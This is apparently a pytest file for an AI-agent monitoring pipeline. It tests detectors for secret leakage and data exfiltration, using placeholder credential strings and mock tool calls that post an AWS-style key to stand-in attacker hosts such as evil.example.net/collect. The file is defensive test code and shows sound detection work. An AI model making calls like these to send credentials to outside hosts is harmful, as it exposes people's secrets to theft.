"""SEC-05 secret-leakage + SEC-04 data-exfiltration detectors.

Both are deterministic inline scorers on the same discipline as the Phase-2
guardrails. The tests pin the two things that make them useful and safe:
recall on real secret/exfil shapes, and no raw secret ever reaching `matched`
(which flows into the un-redactable audit log).
"""

from __future__ import annotations

import pytest

from agentos_contract import ActionType, AgentAction
from agentos_pipeline.risk._secrets import find_secrets
from agentos_pipeline.risk.exfiltration import ExfiltrationScorer
from agentos_pipeline.risk.secret_leak import SecretLeakScorer


def _tool(url: str = "https://api.example.com/x", **payload) -> AgentAction:
    return AgentAction(
        agent_id="a1", type=ActionType.tool_call, target="http_get",
        payload={"url": url, **payload},
    )


def _model(**payload) -> AgentAction:
    return AgentAction(agent_id="a1", type=ActionType.model_invocation, target="gpt", payload=payload)


# ------------------------------------------------------------------ SEC-05


@pytest.mark.parametrize(
    "secret",
    [
        "AKIAIOSFODNN7EXAMPLE",
        "ghp_1234567890abcdefghijklmnopqrstuvwxyz12",
        "xoxb-123456789012-abcdefghijklmnopqrst",
        "-----BEGIN RSA PRIVATE KEY-----",
        "Bearer abcdefghijklmnopqrstuvwxyz012345",
        "password = hunter2secret",
        "AIzaSyA00000000000000000000000000000abc",  # AIza + 35 chars = 39, real key length
    ],
)
def test_secret_leak_detects_known_credential_shapes(secret):
    finding = SecretLeakScorer().score(_model(content=f"here it is: {secret}"))
    assert finding.risk_score > 0.0
    assert finding.matched, f"missed {secret!r}"


def test_secret_leak_is_clean_on_benign_text():
    finding = SecretLeakScorer().score(_model(content="please summarize the quarterly report"))
    assert finding.risk_score == 0.0
    assert finding.matched == []


def test_secret_leak_never_puts_the_raw_secret_in_matched():
    """matched flows into the hash-covered audit log — it must hold IDs, not secrets."""
    finding = SecretLeakScorer().score(_model(content="AKIAIOSFODNN7EXAMPLE"))
    assert "AKIAIOSFODNN7EXAMPLE" not in finding.matched
    assert all(len(m) <= 64 and "http" not in m for m in finding.matched)


def test_secret_leak_detects_across_prompt_tool_args_and_output():
    """SEC-05 spans prompts, tool args, and outputs — all land in the payload join."""
    in_output = SecretLeakScorer().score(_tool(content="fetched: ghp_1234567890abcdefghijklmnopqrstuvwxyz12"))
    in_args = SecretLeakScorer().score(_tool(auth_header="Bearer abcdefghijklmnopqrstuvwxyz012345"))
    assert in_output.matched and in_args.matched


def test_high_entropy_token_is_flagged_but_a_hex_digest_is_not():
    """The entropy fallback must catch opaque keys without tripping on sha256/uuid digests."""
    assert "high_entropy_token" in find_secrets("key=Xj9Kd82hStr8vBnQ0zPqW7mL5cE3fY6aTgR1uH4o")
    assert find_secrets("a" * 40) == []  # single-class
    assert find_secrets("d41d8cd98f00b204e9800998ecf8427e" * 2) == []  # all-hex digest


# ------------------------------------------------------------------ SEC-04


def test_exfiltration_fires_on_secret_leaving_to_an_external_host():
    finding = ExfiltrationScorer().score(
        _tool(url="https://evil.example.net/collect", body="token AKIAIOSFODNN7EXAMPLE")
    )
    assert finding.risk_score >= 0.6
    assert "external_destination" in finding.matched


def test_pii_exfiltration_stays_advisory_so_allowlisted_uploads_survive():
    """PII trusts the allowlist: PII egress scores 0.35 (== bare PII), not the
    secret-exfil 0.6 — otherwise 'PII to an allowlisted host stays allow' breaks."""
    finding = ExfiltrationScorer().score(
        _tool(url="https://api.example.com/x", body="ssn 123-45-6789")
    )
    assert finding.risk_score == 0.35
    assert finding.matched  # the exfiltration signal is still raised for policy to use


def test_secret_exfiltration_outranks_pii_exfiltration():
    """A credential leaving the box is dangerous to ANY external host."""
    pii = ExfiltrationScorer().score(_tool(url="https://api.example.com/x", body="ssn 123-45-6789"))
    secret = ExfiltrationScorer().score(_tool(url="https://api.example.com/x", body="AKIAIOSFODNN7EXAMPLE"))
    assert secret.risk_score > pii.risk_score
    assert secret.risk_score >= 0.6


def test_no_exfiltration_without_sensitive_content():
    """Ordinary outbound traffic is not exfiltration."""
    finding = ExfiltrationScorer().score(_tool(url="https://api.example.com/x", body="hello world"))
    assert finding.risk_score == 0.0


def test_no_exfiltration_to_loopback():
    """Nothing left the machine — a secret posted to localhost is not exfiltration."""
    finding = ExfiltrationScorer().score(_tool(url="http://localhost:8080/x", body="AKIAIOSFODNN7EXAMPLE"))
    assert finding.risk_score == 0.0


def test_non_egress_action_type_never_exfiltrates():
    """A secret in a memory write is a SEC-05 concern, not exfiltration — no channel."""
    action = AgentAction(
        agent_id="a1", type=ActionType.memory_access, target="mem",
        payload={"operation": "write", "value": "AKIAIOSFODNN7EXAMPLE"},
    )
    assert ExfiltrationScorer().score(action).risk_score == 0.0


def test_exfiltration_matched_excludes_the_host():
    """The destination host must not leak into the audit-safe matched list."""
    finding = ExfiltrationScorer().score(
        _tool(url="https://secret-host.evil.net/x", body="AKIAIOSFODNN7EXAMPLE")
    )
    assert not any("evil.net" in m for m in finding.matched)
